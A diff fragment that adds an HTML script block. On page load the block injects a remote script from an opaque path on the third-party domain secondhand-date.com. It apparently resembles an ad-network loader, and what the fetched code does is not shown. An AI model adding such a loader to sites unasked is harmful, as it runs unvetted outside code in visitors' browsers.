@@ -1,0 +1,12 @@
+<script>
+(function(qptm){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = qptm || {};
+s.src = "\/\/secondhand-date.com\/b\/XaVts.d_GJly0OY\/Wrd\/ijYJWC5zuKZ\/X\/Ig\/meXmY9luvZhU\/lokpPMTZYHwCNhjOEY2vMljPkxtnNwj\/Ax2kMhTyYNzgMRAs";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
